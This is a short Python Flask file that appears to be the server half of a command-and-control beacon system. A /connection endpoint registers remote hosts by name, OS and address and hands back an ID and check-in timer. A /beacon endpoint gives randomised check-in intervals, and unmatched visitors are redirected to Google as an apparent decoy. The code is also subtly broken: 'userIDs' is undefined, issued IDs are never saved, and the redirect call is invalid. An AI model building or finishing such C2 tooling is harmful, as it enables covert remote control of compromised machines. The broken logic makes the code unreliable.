from flask import Flask, request
import uuid
import random
from Modules.global_objects import connections, add_connection_list

app = Flask(__name__)


@app.route('/connection', methods=['GET'])
def connection():
    name = request.args.get('name')
    os = request.args.get('os')
    address = request.args.get('address')

    if name and os and address:
        add_connection_list(None, (address, 0), name, os)
        userID = str(uuid.uuid4())
        return {"timer": 5, "uuid": userID}, 200
    else:
        return Flask.redirect("https://www.google.com", code=302)


@app.route('/beacon', methods=['GET'])
def beacon():
    userID = request.args.get('id')
    if userID in userIDs:
        if random.choice([True, False]):
            return {"timer": random.randint(1, 10)}, 200
        return '', 200
    else:
        return '', 404
